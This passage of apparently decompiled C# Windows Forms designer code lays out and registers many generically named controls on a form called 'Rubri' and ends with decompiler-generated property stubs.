			this.CheckedListBox55.Location = new Point(459, 138);
			this.CheckedListBox55.Name = "CheckedListBox55";
			this.CheckedListBox55.Size = new Size(8, 4);
			this.CheckedListBox55.TabIndex = 236;
			this.Label26.AutoSize = true;
			this.Label26.Location = new Point(374, 204);
			this.Label26.Name = "Label26";
			this.Label26.Size = new Size(45, 13);
			this.Label26.TabIndex = 235;
			this.Label26.Text = "Label26";
			this.DateTimePicker40.Location = new Point(329, 268);
			this.DateTimePicker40.Name = "DateTimePicker40";
			this.DateTimePicker40.Size = new Size(25, 20);
			this.DateTimePicker40.TabIndex = 234;
			this.ComboBox29.FormattingEnabled = true;
			this.ComboBox29.Location = new Point(313, 157);
			this.ComboBox29.Name = "ComboBox29";
			this.ComboBox29.Size = new Size(33, 21);
			this.ComboBox29.TabIndex = 233;
			this.CheckedListBox56.FormattingEnabled = true;
			this.CheckedListBox56.Location = new Point(183, 157);
			this.CheckedListBox56.Name = "CheckedListBox56";
			this.CheckedListBox56.Size = new Size(35, 4);
			this.CheckedListBox56.TabIndex = 232;
			this.MaskedTextBox26.Location = new Point(412, 280);
			this.MaskedTextBox26.Name = "MaskedTextBox26";
			this.MaskedTextBox26.Size = new Size(47, 20);
			this.MaskedTextBox26.TabIndex = 231;
			this.ListView40.HideSelection = false;
			this.ListView40.Location = new Point(81, 280);
			this.ListView40.Name = "ListView40";
			this.ListView40.Size = new Size(86, 16);
			this.ListView40.TabIndex = 230;
			this.ListView40.UseCompatibleStateImageBehavior = false;
			this.CheckBox35.AutoSize = true;
			this.CheckBox35.Location = new Point(620, 240);
			this.CheckBox35.Name = "CheckBox35";
			this.CheckBox35.Size = new Size(87, 17);
			this.CheckBox35.TabIndex = 229;
			this.CheckBox35.Text = "CheckBox35";
			this.CheckBox35.UseVisualStyleBackColor = true;
			this.MaskedTextBox27.Location = new Point(113, 92);
			this.MaskedTextBox27.Name = "MaskedTextBox27";
			this.MaskedTextBox27.Size = new Size(100, 20);
			this.MaskedTextBox27.TabIndex = 228;
			this.CheckBox36.AutoSize = true;
			this.CheckBox36.Location = new Point(-8, 26);
			this.CheckBox36.Name = "CheckBox36";
			this.CheckBox36.Size = new Size(87, 17);
			this.CheckBox36.TabIndex = 227;
			this.CheckBox36.Text = "CheckBox36";
			this.CheckBox36.UseVisualStyleBackColor = true;
			this.ListView41.HideSelection = false;
			this.ListView41.Location = new Point(97, 76);
			this.ListView41.Name = "ListView41";
			this.ListView41.Size = new Size(121, 97);
			this.ListView41.TabIndex = 226;
			this.ListView41.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox57.FormattingEnabled = true;
			this.CheckedListBox57.Location = new Point(89, 68);
			this.CheckedListBox57.Name = "CheckedListBox57";
			this.CheckedListBox57.Size = new Size(120, 94);
			this.CheckedListBox57.TabIndex = 225;
			this.ComboBox30.FormattingEnabled = true;
			this.ComboBox30.Location = new Point(98, 195);
			this.ComboBox30.Name = "ComboBox30";
			this.ComboBox30.Size = new Size(121, 21);
			this.ComboBox30.TabIndex = 224;
			this.RadioButton15.AutoSize = true;
			this.RadioButton15.Location = new Point(287, 252);
			this.RadioButton15.Name = "RadioButton15";
			this.RadioButton15.Size = new Size(96, 17);
			this.RadioButton15.TabIndex = 223;
			this.RadioButton15.TabStop = true;
			this.RadioButton15.Text = "RadioButton15";
			this.RadioButton15.UseVisualStyleBackColor = true;
			this.ProgressBar15.Location = new Point(239, 231);
			this.ProgressBar15.Name = "ProgressBar15";
			this.ProgressBar15.Size = new Size(100, 23);
			this.ProgressBar15.TabIndex = 222;
			this.Button12.Location = new Point(568, 194);
			this.Button12.Name = "Button12";
			this.Button12.Size = new Size(75, 23);
			this.Button12.TabIndex = 221;
			this.Button12.Text = "Button12";
			this.Button12.UseVisualStyleBackColor = true;
			this.CheckBox37.AutoSize = true;
			this.CheckBox37.Location = new Point(432, 219);
			this.CheckBox37.Name = "CheckBox37";
			this.CheckBox37.Size = new Size(87, 17);
			this.CheckBox37.TabIndex = 220;
			this.CheckBox37.Text = "CheckBox37";
			this.CheckBox37.UseVisualStyleBackColor = true;
			this.DateTimePicker41.Location = new Point(394, 138);
			this.DateTimePicker41.Name = "DateTimePicker41";
			this.DateTimePicker41.Size = new Size(200, 20);
			this.DateTimePicker41.TabIndex = 219;
			this.DateTimePicker42.Location = new Point(370, 200);
			this.DateTimePicker42.Name = "DateTimePicker42";
			this.DateTimePicker42.Size = new Size(200, 20);
			this.DateTimePicker42.TabIndex = 218;
			this.MonthCalendar15.Location = new Point(34, 49);
			this.MonthCalendar15.Name = "MonthCalendar15";
			this.MonthCalendar15.TabIndex = 217;
			this.Label27.AutoSize = true;
			this.Label27.Location = new Point(552, 219);
			this.Label27.Name = "Label27";
			this.Label27.Size = new Size(45, 13);
			this.Label27.TabIndex = 216;
			this.Label27.Text = "Label27";
			this.ListView42.HideSelection = false;
			this.ListView42.Location = new Point(599, 94);
			this.ListView42.Name = "ListView42";
			this.ListView42.Size = new Size(8, 8);
			this.ListView42.TabIndex = 215;
			this.ListView42.UseCompatibleStateImageBehavior = false;
			this.PictureBox15.Location = new Point(313, 244);
			this.PictureBox15.Name = "PictureBox15";
			this.PictureBox15.Size = new Size(100, 50);
			this.PictureBox15.TabIndex = 214;
			this.PictureBox15.TabStop = false;
			this.CheckedListBox58.FormattingEnabled = true;
			this.CheckedListBox58.Location = new Point(51, -11);
			this.CheckedListBox58.Name = "CheckedListBox58";
			this.CheckedListBox58.Size = new Size(120, 94);
			this.CheckedListBox58.TabIndex = 213;
			this.CheckedListBox59.FormattingEnabled = true;
			this.CheckedListBox59.Location = new Point(452, 113);
			this.CheckedListBox59.Name = "CheckedListBox59";
			this.CheckedListBox59.Size = new Size(8, 4);
			this.CheckedListBox59.TabIndex = 212;
			this.Label28.AutoSize = true;
			this.Label28.Location = new Point(367, 179);
			this.Label28.Name = "Label28";
			this.Label28.Size = new Size(45, 13);
			this.Label28.TabIndex = 211;
			this.Label28.Text = "Label28";
			this.DateTimePicker43.Location = new Point(322, 243);
			this.DateTimePicker43.Name = "DateTimePicker43";
			this.DateTimePicker43.Size = new Size(25, 20);
			this.DateTimePicker43.TabIndex = 210;
			this.ComboBox31.FormattingEnabled = true;
			this.ComboBox31.Location = new Point(306, 132);
			this.ComboBox31.Name = "ComboBox31";
			this.ComboBox31.Size = new Size(33, 21);
			this.ComboBox31.TabIndex = 209;
			this.CheckedListBox60.FormattingEnabled = true;
			this.CheckedListBox60.Location = new Point(176, 132);
			this.CheckedListBox60.Name = "CheckedListBox60";
			this.CheckedListBox60.Size = new Size(35, 4);
			this.CheckedListBox60.TabIndex = 208;
			this.MaskedTextBox28.Location = new Point(405, 255);
			this.MaskedTextBox28.Name = "MaskedTextBox28";
			this.MaskedTextBox28.Size = new Size(47, 20);
			this.MaskedTextBox28.TabIndex = 207;
			this.ListView43.HideSelection = false;
			this.ListView43.Location = new Point(74, 255);
			this.ListView43.Name = "ListView43";
			this.ListView43.Size = new Size(86, 16);
			this.ListView43.TabIndex = 206;
			this.ListView43.UseCompatibleStateImageBehavior = false;
			this.CheckBox38.AutoSize = true;
			this.CheckBox38.Location = new Point(613, 215);
			this.CheckBox38.Name = "CheckBox38";
			this.CheckBox38.Size = new Size(87, 17);
			this.CheckBox38.TabIndex = 205;
			this.CheckBox38.Text = "CheckBox38";
			this.CheckBox38.UseVisualStyleBackColor = true;
			this.MaskedTextBox29.Location = new Point(106, 67);
			this.MaskedTextBox29.Name = "MaskedTextBox29";
			this.MaskedTextBox29.Size = new Size(100, 20);
			this.MaskedTextBox29.TabIndex = 204;
			this.CheckBox39.AutoSize = true;
			this.CheckBox39.Location = new Point(-15, 1);
			this.CheckBox39.Name = "CheckBox39";
			this.CheckBox39.Size = new Size(87, 17);
			this.CheckBox39.TabIndex = 203;
			this.CheckBox39.Text = "CheckBox39";
			this.CheckBox39.UseVisualStyleBackColor = true;
			this.ListView44.HideSelection = false;
			this.ListView44.Location = new Point(90, 51);
			this.ListView44.Name = "ListView44";
			this.ListView44.Size = new Size(121, 97);
			this.ListView44.TabIndex = 202;
			this.ListView44.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox61.FormattingEnabled = true;
			this.CheckedListBox61.Location = new Point(82, 43);
			this.CheckedListBox61.Name = "CheckedListBox61";
			this.CheckedListBox61.Size = new Size(120, 94);
			this.CheckedListBox61.TabIndex = 201;
			this.LinkLabel2.AutoSize = true;
			this.LinkLabel2.Location = new Point(-39, -23);
			this.LinkLabel2.Name = "LinkLabel2";
			this.LinkLabel2.Size = new Size(59, 13);
			this.LinkLabel2.TabIndex = 200;
			this.LinkLabel2.TabStop = true;
			this.LinkLabel2.Text = "LinkLabel2";
			this.ComboBox32.FormattingEnabled = true;
			this.ComboBox32.Location = new Point(91, 170);
			this.ComboBox32.Name = "ComboBox32";
			this.ComboBox32.Size = new Size(121, 21);
			this.ComboBox32.TabIndex = 199;
			this.RadioButton16.AutoSize = true;
			this.RadioButton16.Location = new Point(280, 227);
			this.RadioButton16.Name = "RadioButton16";
			this.RadioButton16.Size = new Size(96, 17);
			this.RadioButton16.TabIndex = 198;
			this.RadioButton16.TabStop = true;
			this.RadioButton16.Text = "RadioButton16";
			this.RadioButton16.UseVisualStyleBackColor = true;
			this.ProgressBar16.Location = new Point(200, 212);
			this.ProgressBar16.Name = "ProgressBar16";
			this.ProgressBar16.Size = new Size(100, 23);
			this.ProgressBar16.TabIndex = 197;
			this.NumericUpDown2.Location = new Point(261, 339);
			this.NumericUpDown2.Name = "NumericUpDown2";
			this.NumericUpDown2.Size = new Size(120, 20);
			this.NumericUpDown2.TabIndex = 196;
			this.ListBox2.FormattingEnabled = true;
			this.ListBox2.Location = new Point(375, 342);
			this.ListBox2.Name = "ListBox2";
			this.ListBox2.Size = new Size(120, 95);
			this.ListBox2.TabIndex = 195;
			this.Button13.Location = new Point(561, 169);
			this.Button13.Name = "Button13";
			this.Button13.Size = new Size(75, 23);
			this.Button13.TabIndex = 194;
			this.Button13.Text = "Button13";
			this.Button13.UseVisualStyleBackColor = true;
			this.CheckBox40.AutoSize = true;
			this.CheckBox40.Location = new Point(425, 194);
			this.CheckBox40.Name = "CheckBox40";
			this.CheckBox40.Size = new Size(87, 17);
			this.CheckBox40.TabIndex = 193;
			this.CheckBox40.Text = "CheckBox40";
			this.CheckBox40.UseVisualStyleBackColor = true;
			this.DateTimePicker44.Location = new Point(387, 113);
			this.DateTimePicker44.Name = "DateTimePicker44";
			this.DateTimePicker44.Size = new Size(200, 20);
			this.DateTimePicker44.TabIndex = 192;
			this.DateTimePicker45.Location = new Point(452, 223);
			this.DateTimePicker45.Name = "DateTimePicker45";
			this.DateTimePicker45.Size = new Size(200, 20);
			this.DateTimePicker45.TabIndex = 191;
			this.MonthCalendar16.Location = new Point(34, 146);
			this.MonthCalendar16.Name = "MonthCalendar16";
			this.MonthCalendar16.TabIndex = 190;
			this.Label29.AutoSize = true;
			this.Label29.Location = new Point(545, 194);
			this.Label29.Name = "Label29";
			this.Label29.Size = new Size(45, 13);
			this.Label29.TabIndex = 189;
			this.Label29.Text = "Label29";
			this.ListView45.HideSelection = false;
			this.ListView45.Location = new Point(592, 69);
			this.ListView45.Name = "ListView45";
			this.ListView45.Size = new Size(8, 8);
			this.ListView45.TabIndex = 188;
			this.ListView45.UseCompatibleStateImageBehavior = false;
			this.PictureBox16.Location = new Point(306, 219);
			this.PictureBox16.Name = "PictureBox16";
			this.PictureBox16.Size = new Size(100, 50);
			this.PictureBox16.TabIndex = 187;
			this.PictureBox16.TabStop = false;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(771, 398);
			base.Controls.Add(this.CheckedListBox32);
			base.Controls.Add(this.Label16);
			base.Controls.Add(this.DateTimePicker24);
			base.Controls.Add(this.ComboBox17);
			base.Controls.Add(this.CheckedListBox33);
			base.Controls.Add(this.ListView24);
			base.Controls.Add(this.MaskedTextBox16);
			base.Controls.Add(this.ListView25);
			base.Controls.Add(this.CheckedListBox34);
			base.Controls.Add(this.ComboBox18);
			base.Controls.Add(this.RadioButton9);
			base.Controls.Add(this.ProgressBar9);
			base.Controls.Add(this.DateTimePicker25);
			base.Controls.Add(this.MonthCalendar9);
			base.Controls.Add(this.PictureBox9);
			base.Controls.Add(this.CheckedListBox35);
			base.Controls.Add(this.CheckedListBox36);
			base.Controls.Add(this.Label17);
			base.Controls.Add(this.DateTimePicker26);
			base.Controls.Add(this.ComboBox19);
			base.Controls.Add(this.CheckedListBox37);
			base.Controls.Add(this.MaskedTextBox17);
			base.Controls.Add(this.ListView26);
			base.Controls.Add(this.CheckBox22);
			base.Controls.Add(this.MaskedTextBox18);
			base.Controls.Add(this.CheckBox23);
			base.Controls.Add(this.ListView27);
			base.Controls.Add(this.CheckedListBox38);
			base.Controls.Add(this.ComboBox20);
			base.Controls.Add(this.RadioButton10);
			base.Controls.Add(this.ProgressBar10);
			base.Controls.Add(this.Button8);
			base.Controls.Add(this.CheckBox24);
			base.Controls.Add(this.DateTimePicker27);
			base.Controls.Add(this.DateTimePicker28);
			base.Controls.Add(this.MonthCalendar10);
			base.Controls.Add(this.Label18);
			base.Controls.Add(this.ListView28);
			base.Controls.Add(this.PictureBox10);
			base.Controls.Add(this.CheckedListBox39);
			base.Controls.Add(this.CheckedListBox40);
			base.Controls.Add(this.Label19);
			base.Controls.Add(this.DateTimePicker29);
			base.Controls.Add(this.ComboBox21);
			base.Controls.Add(this.CheckedListBox41);
			base.Controls.Add(this.MaskedTextBox19);
			base.Controls.Add(this.ListView29);
			base.Controls.Add(this.CheckBox25);
			base.Controls.Add(this.MaskedTextBox20);
			base.Controls.Add(this.CheckBox26);
			base.Controls.Add(this.ListView30);
			base.Controls.Add(this.CheckedListBox42);
			base.Controls.Add(this.ComboBox22);
			base.Controls.Add(this.RadioButton11);
			base.Controls.Add(this.ProgressBar11);
			base.Controls.Add(this.Button9);
			base.Controls.Add(this.CheckBox27);
			base.Controls.Add(this.DateTimePicker30);
			base.Controls.Add(this.DateTimePicker31);
			base.Controls.Add(this.MonthCalendar11);
			base.Controls.Add(this.Label20);
			base.Controls.Add(this.ListView31);
			base.Controls.Add(this.PictureBox11);
			base.Controls.Add(this.CheckedListBox43);
			base.Controls.Add(this.CheckedListBox44);
			base.Controls.Add(this.Label21);
			base.Controls.Add(this.DateTimePicker32);
			base.Controls.Add(this.ComboBox23);
			base.Controls.Add(this.CheckedListBox45);
			base.Controls.Add(this.MaskedTextBox21);
			base.Controls.Add(this.ListView32);
			base.Controls.Add(this.CheckBox28);
			base.Controls.Add(this.MaskedTextBox22);
			base.Controls.Add(this.CheckBox29);
			base.Controls.Add(this.ListView33);
			base.Controls.Add(this.CheckedListBox46);
			base.Controls.Add(this.ComboBox24);
			base.Controls.Add(this.RadioButton12);
			base.Controls.Add(this.ProgressBar12);
			base.Controls.Add(this.Button10);
			base.Controls.Add(this.CheckBox30);
			base.Controls.Add(this.DateTimePicker33);
			base.Controls.Add(this.DateTimePicker34);
			base.Controls.Add(this.MonthCalendar12);
			base.Controls.Add(this.Label22);
			base.Controls.Add(this.ListView34);
			base.Controls.Add(this.PictureBox12);
			base.Controls.Add(this.CheckedListBox47);
			base.Controls.Add(this.Label23);
			base.Controls.Add(this.DateTimePicker35);
			base.Controls.Add(this.ComboBox25);
			base.Controls.Add(this.CheckedListBox48);
			base.Controls.Add(this.ListView35);
			base.Controls.Add(this.MaskedTextBox23);
			base.Controls.Add(this.CheckBox31);
			base.Controls.Add(this.ListView36);
			base.Controls.Add(this.CheckedListBox49);
			base.Controls.Add(this.ComboBox26);
			base.Controls.Add(this.RadioButton13);
			base.Controls.Add(this.ProgressBar13);
			base.Controls.Add(this.DateTimePicker36);
			base.Controls.Add(this.MonthCalendar13);
			base.Controls.Add(this.PictureBox13);
			base.Controls.Add(this.CheckedListBox50);
			base.Controls.Add(this.CheckedListBox51);
			base.Controls.Add(this.Label24);
			base.Controls.Add(this.DateTimePicker37);
			base.Controls.Add(this.ComboBox27);
			base.Controls.Add(this.CheckedListBox52);
			base.Controls.Add(this.MaskedTextBox24);
			base.Controls.Add(this.ListView37);
			base.Controls.Add(this.CheckBox32);
			base.Controls.Add(this.MaskedTextBox25);
			base.Controls.Add(this.CheckBox33);
			base.Controls.Add(this.ListView38);
			base.Controls.Add(this.CheckedListBox53);
			base.Controls.Add(this.ComboBox28);
			base.Controls.Add(this.RadioButton14);
			base.Controls.Add(this.ProgressBar14);
			base.Controls.Add(this.Button11);
			base.Controls.Add(this.CheckBox34);
			base.Controls.Add(this.DateTimePicker38);
			base.Controls.Add(this.DateTimePicker39);
			base.Controls.Add(this.MonthCalendar14);
			base.Controls.Add(this.Label25);
			base.Controls.Add(this.ListView39);
			base.Controls.Add(this.PictureBox14);
			base.Controls.Add(this.CheckedListBox54);
			base.Controls.Add(this.CheckedListBox55);
			base.Controls.Add(this.Label26);
			base.Controls.Add(this.DateTimePicker40);
			base.Controls.Add(this.ComboBox29);
			base.Controls.Add(this.CheckedListBox56);
			base.Controls.Add(this.MaskedTextBox26);
			base.Controls.Add(this.ListView40);
			base.Controls.Add(this.CheckBox35);
			base.Controls.Add(this.MaskedTextBox27);
			base.Controls.Add(this.CheckBox36);
			base.Controls.Add(this.ListView41);
			base.Controls.Add(this.CheckedListBox57);
			base.Controls.Add(this.ComboBox30);
			base.Controls.Add(this.RadioButton15);
			base.Controls.Add(this.ProgressBar15);
			base.Controls.Add(this.Button12);
			base.Controls.Add(this.CheckBox37);
			base.Controls.Add(this.DateTimePicker41);
			base.Controls.Add(this.DateTimePicker42);
			base.Controls.Add(this.MonthCalendar15);
			base.Controls.Add(this.Label27);
			base.Controls.Add(this.ListView42);
			base.Controls.Add(this.PictureBox15);
			base.Controls.Add(this.CheckedListBox58);
			base.Controls.Add(this.CheckedListBox59);
			base.Controls.Add(this.Label28);
			base.Controls.Add(this.DateTimePicker43);
			base.Controls.Add(this.ComboBox31);
			base.Controls.Add(this.CheckedListBox60);
			base.Controls.Add(this.MaskedTextBox28);
			base.Controls.Add(this.ListView43);
			base.Controls.Add(this.CheckBox38);
			base.Controls.Add(this.MaskedTextBox29);
			base.Controls.Add(this.CheckBox39);
			base.Controls.Add(this.ListView44);
			base.Controls.Add(this.CheckedListBox61);
			base.Controls.Add(this.LinkLabel2);
			base.Controls.Add(this.ComboBox32);
			base.Controls.Add(this.RadioButton16);
			base.Controls.Add(this.ProgressBar16);
			base.Controls.Add(this.NumericUpDown2);
			base.Controls.Add(this.ListBox2);
			base.Controls.Add(this.Button13);
			base.Controls.Add(this.CheckBox40);
			base.Controls.Add(this.DateTimePicker44);
			base.Controls.Add(this.DateTimePicker45);
			base.Controls.Add(this.MonthCalendar16);
			base.Controls.Add(this.Label29);
			base.Controls.Add(this.ListView45);
			base.Controls.Add(this.PictureBox16);
			base.Controls.Add(this.CheckedListBox17);
			base.Controls.Add(this.Label9);
			base.Controls.Add(this.DateTimePicker13);
			base.Controls.Add(this.ComboBox9);
			base.Controls.Add(this.CheckedListBox18);
			base.Controls.Add(this.ListView13);
			base.Controls.Add(this.MaskedTextBox9);
			base.Controls.Add(this.ListView14);
			base.Controls.Add(this.CheckedListBox19);
			base.Controls.Add(this.ComboBox10);
			base.Controls.Add(this.RadioButton5);
			base.Controls.Add(this.ProgressBar5);
			base.Controls.Add(this.DateTimePicker14);
			base.Controls.Add(this.MonthCalendar5);
			base.Controls.Add(this.PictureBox5);
			base.Controls.Add(this.CheckedListBox20);
			base.Controls.Add(this.CheckedListBox21);
			base.Controls.Add(this.Label10);
			base.Controls.Add(this.DateTimePicker15);
			base.Controls.Add(this.ComboBox11);
			base.Controls.Add(this.CheckedListBox22);
			base.Controls.Add(this.MaskedTextBox10);
			base.Controls.Add(this.ListView15);
			base.Controls.Add(this.CheckBox13);
			base.Controls.Add(this.MaskedTextBox11);
			base.Controls.Add(this.CheckBox14);
			base.Controls.Add(this.ListView16);
			base.Controls.Add(this.CheckedListBox23);
			base.Controls.Add(this.ComboBox12);
			base.Controls.Add(this.RadioButton6);
			base.Controls.Add(this.ProgressBar6);
			base.Controls.Add(this.Button5);
			base.Controls.Add(this.CheckBox15);
			base.Controls.Add(this.DateTimePicker16);
			base.Controls.Add(this.DateTimePicker17);
			base.Controls.Add(this.MonthCalendar6);
			base.Controls.Add(this.Label11);
			base.Controls.Add(this.ListView17);
			base.Controls.Add(this.PictureBox6);
			base.Controls.Add(this.CheckedListBox24);
			base.Controls.Add(this.CheckedListBox25);
			base.Controls.Add(this.Label12);
			base.Controls.Add(this.DateTimePicker18);
			base.Controls.Add(this.ComboBox13);
			base.Controls.Add(this.CheckedListBox26);
			base.Controls.Add(this.MaskedTextBox12);
			base.Controls.Add(this.ListView18);
			base.Controls.Add(this.CheckBox16);
			base.Controls.Add(this.MaskedTextBox13);
			base.Controls.Add(this.CheckBox17);
			base.Controls.Add(this.ListView19);
			base.Controls.Add(this.CheckedListBox27);
			base.Controls.Add(this.ComboBox14);
			base.Controls.Add(this.RadioButton7);
			base.Controls.Add(this.ProgressBar7);
			base.Controls.Add(this.Button6);
			base.Controls.Add(this.CheckBox18);
			base.Controls.Add(this.DateTimePicker19);
			base.Controls.Add(this.DateTimePicker20);
			base.Controls.Add(this.MonthCalendar7);
			base.Controls.Add(this.Label13);
			base.Controls.Add(this.ListView20);
			base.Controls.Add(this.PictureBox7);
			base.Controls.Add(this.CheckedListBox28);
			base.Controls.Add(this.CheckedListBox29);
			base.Controls.Add(this.Label14);
			base.Controls.Add(this.DateTimePicker21);
			base.Controls.Add(this.ComboBox15);
			base.Controls.Add(this.CheckedListBox30);
			base.Controls.Add(this.MaskedTextBox14);
			base.Controls.Add(this.ListView21);
			base.Controls.Add(this.CheckBox19);
			base.Controls.Add(this.MaskedTextBox15);
			base.Controls.Add(this.CheckBox20);
			base.Controls.Add(this.ListView22);
			base.Controls.Add(this.CheckedListBox31);
			base.Controls.Add(this.ComboBox16);
			base.Controls.Add(this.RadioButton8);
			base.Controls.Add(this.ProgressBar8);
			base.Controls.Add(this.Button7);
			base.Controls.Add(this.CheckBox21);
			base.Controls.Add(this.DateTimePicker22);
			base.Controls.Add(this.DateTimePicker23);
			base.Controls.Add(this.MonthCalendar8);
			base.Controls.Add(this.Label15);
			base.Controls.Add(this.ListView23);
			base.Controls.Add(this.PictureBox8);
			base.Controls.Add(this.CheckedListBox13);
			base.Controls.Add(this.CheckedListBox14);
			base.Controls.Add(this.Label7);
			base.Controls.Add(this.DateTimePicker10);
			base.Controls.Add(this.ComboBox7);
			base.Controls.Add(this.CheckedListBox15);
			base.Controls.Add(this.MaskedTextBox7);
			base.Controls.Add(this.ListView10);
			base.Controls.Add(this.CheckBox10);
			base.Controls.Add(this.MaskedTextBox8);
			base.Controls.Add(this.CheckBox11);
			base.Controls.Add(this.ListView11);
			base.Controls.Add(this.CheckedListBox16);
			base.Controls.Add(this.ComboBox8);
			base.Controls.Add(this.RadioButton4);
			base.Controls.Add(this.ProgressBar4);
			base.Controls.Add(this.Button4);
			base.Controls.Add(this.CheckBox12);
			base.Controls.Add(this.DateTimePicker11);
			base.Controls.Add(this.DateTimePicker12);
			base.Controls.Add(this.MonthCalendar4);
			base.Controls.Add(this.Label8);
			base.Controls.Add(this.ListView12);
			base.Controls.Add(this.PictureBox4);
			base.Controls.Add(this.CheckedListBox9);
			base.Controls.Add(this.CheckedListBox10);
			base.Controls.Add(this.Label5);
			base.Controls.Add(this.DateTimePicker7);
			base.Controls.Add(this.ComboBox5);
			base.Controls.Add(this.CheckedListBox11);
			base.Controls.Add(this.MaskedTextBox5);
			base.Controls.Add(this.ListView7);
			base.Controls.Add(this.CheckBox7);
			base.Controls.Add(this.MaskedTextBox6);
			base.Controls.Add(this.CheckBox8);
			base.Controls.Add(this.ListView8);
			base.Controls.Add(this.CheckedListBox12);
			base.Controls.Add(this.ComboBox6);
			base.Controls.Add(this.RadioButton3);
			base.Controls.Add(this.ProgressBar3);
			base.Controls.Add(this.Button3);
			base.Controls.Add(this.CheckBox9);
			base.Controls.Add(this.DateTimePicker8);
			base.Controls.Add(this.DateTimePicker9);
			base.Controls.Add(this.MonthCalendar3);
			base.Controls.Add(this.Label6);
			base.Controls.Add(this.ListView9);
			base.Controls.Add(this.PictureBox3);
			base.Controls.Add(this.CheckedListBox5);
			base.Controls.Add(this.CheckedListBox6);
			base.Controls.Add(this.Label3);
			base.Controls.Add(this.DateTimePicker4);
			base.Controls.Add(this.ComboBox3);
			base.Controls.Add(this.CheckedListBox7);
			base.Controls.Add(this.MaskedTextBox3);
			base.Controls.Add(this.ListView4);
			base.Controls.Add(this.CheckBox4);
			base.Controls.Add(this.MaskedTextBox4);
			base.Controls.Add(this.CheckBox5);
			base.Controls.Add(this.ListView5);
			base.Controls.Add(this.CheckedListBox8);
			base.Controls.Add(this.ComboBox4);
			base.Controls.Add(this.RadioButton2);
			base.Controls.Add(this.ProgressBar2);
			base.Controls.Add(this.Button2);
			base.Controls.Add(this.CheckBox6);
			base.Controls.Add(this.DateTimePicker5);
			base.Controls.Add(this.DateTimePicker6);
			base.Controls.Add(this.MonthCalendar2);
			base.Controls.Add(this.Label4);
			base.Controls.Add(this.ListView6);
			base.Controls.Add(this.PictureBox2);
			base.Controls.Add(this.CheckedListBox4);
			base.Controls.Add(this.CheckedListBox3);
			base.Controls.Add(this.Label2);
			base.Controls.Add(this.DateTimePicker3);
			base.Controls.Add(this.ComboBox2);
			base.Controls.Add(this.CheckedListBox2);
			base.Controls.Add(this.MaskedTextBox2);
			base.Controls.Add(this.ListView3);
			base.Controls.Add(this.CheckBox3);
			base.Controls.Add(this.MaskedTextBox1);
			base.Controls.Add(this.CheckBox2);
			base.Controls.Add(this.ListView2);
			base.Controls.Add(this.CheckedListBox1);
			base.Controls.Add(this.LinkLabel1);
			base.Controls.Add(this.ComboBox1);
			base.Controls.Add(this.TextBox1);
			base.Controls.Add(this.RadioButton1);
			base.Controls.Add(this.ProgressBar1);
			base.Controls.Add(this.NumericUpDown1);
			base.Controls.Add(this.ListBox1);
			base.Controls.Add(this.Button1);
			base.Controls.Add(this.CheckBox1);
			base.Controls.Add(this.DateTimePicker2);
			base.Controls.Add(this.DateTimePicker1);
			base.Controls.Add(this.MonthCalendar1);
			base.Controls.Add(this.Label1);
			base.Controls.Add(this.ListView1);
			base.Controls.Add(this.PictureBox1);
			base.Name = "Rubri";
			this.Text = "Rubri";
			((ISupportInitialize)this.PictureBox1).EndInit();
			((ISupportInitialize)this.NumericUpDown1).EndInit();
			((ISupportInitialize)this.PictureBox2).EndInit();
			((ISupportInitialize)this.PictureBox3).EndInit();
			((ISupportInitialize)this.PictureBox4).EndInit();
			((ISupportInitialize)this.PictureBox5).EndInit();
			((ISupportInitialize)this.PictureBox6).EndInit();
			((ISupportInitialize)this.PictureBox7).EndInit();
			((ISupportInitialize)this.PictureBox8).EndInit();
			((ISupportInitialize)this.PictureBox9).EndInit();
			((ISupportInitialize)this.PictureBox10).EndInit();
			((ISupportInitialize)this.PictureBox11).EndInit();
			((ISupportInitialize)this.PictureBox12).EndInit();
			((ISupportInitialize)this.PictureBox13).EndInit();
			((ISupportInitialize)this.PictureBox14).EndInit();
			((ISupportInitialize)this.PictureBox15).EndInit();
			((ISupportInitialize)this.NumericUpDown2).EndInit();
			((ISupportInitialize)this.PictureBox16).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x17000679 RID: 1657
		// (get) Token: 0x06000D60 RID: 3424 RVA: 0x0004E53C File Offset: 0x0004C73C
		// (set) Token: 0x06000D61 RID: 3425 RVA: 0x0004E544 File Offset: 0x0004C744
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700067A RID: 1658
		// (get) Token: 0x06000D62 RID: 3426 RVA: 0x0004E54D File Offset: 0x0004C74D
		// (set) Token: 0x06000D63 RID: 3427 RVA: 0x0004E555 File Offset: 0x0004C755
		internal virtual ListView ListView1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700067B RID: 1659
		// (get) Token: 0x06000D64 RID: 3428 RVA: 0x0004E55E File Offset: 0x0004C75E
		// (set) Token: 0x06000D65 RID: 3429 RVA: 0x0004E566 File Offset: 0x0004C766
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700067C RID: 1660
		// (get) Token: 0x06000D66 RID: 3430 RVA: 0x0004E56F File Offset: 0x0004C76F
		// (set) Token: 0x06000D67 RID: 3431 RVA: 0x0004E577 File Offset: 0x0004C777
		internal virtual MonthCalendar MonthCalendar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700067D RID: 1661
		// (get) Token: 0x06000D68 RID: 3432 RVA: 0x0004E580 File Offset: 0x0004C780
		// (set) Token: 0x06000D69 RID: 3433 RVA: 0x0004E588 File Offset: 0x0004C788
		internal virtual DateTimePicker DateTimePicker1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700067E RID: 1662
		// (get) Token: 0x06000D6A RID: 3434 RVA: 0x0004E591 File Offset: 0x0004C791
		// (set) Token: 0x06000D6B RID: 3435 RVA: 0x0004E599 File Offset: 0x0004C799
		internal virtual DateTimePicker DateTimePicker2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700067F RID: 1663
		// (get) Token: 0x06000D6C RID: 3436 RVA: 0x0004E5A2 File Offset: 0x0004C7A2
		// (set) Token: 0x06000D6D RID: 3437 RVA: 0x0004E5AA File Offset: 0x0004C7AA
